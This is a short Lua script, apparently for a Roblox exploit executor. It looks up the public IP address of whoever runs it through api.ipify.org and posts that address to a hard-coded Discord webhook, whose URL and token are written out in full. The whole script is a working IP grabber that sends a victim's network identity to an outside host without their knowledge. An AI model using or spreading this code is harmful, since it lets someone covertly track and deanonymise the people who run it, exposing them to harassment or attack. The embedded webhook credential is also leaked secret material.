local http_service = game:GetService("HttpService")

-- Function to get public IP address
local function getPublicIP()
    local ip_response = request({
        Url = "https://api.ipify.org",
        Method = "GET"
    })
    return ip_response.Body
end

local ip_address = getPublicIP()

local url = "https://discord.com/api/webhooks/1059784907297149009/ObtD7JRVz4pMeSq9XxKgzwRGRDhlErYx2pGHsILnfxT-pT9H4ElYqdYoSQUA-rv9rTVX"
local data = {
    ["content"] = "IP Address: " .. ip_address
}
local newdata = http_service:JSONEncode(data)

local headers = {
    ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
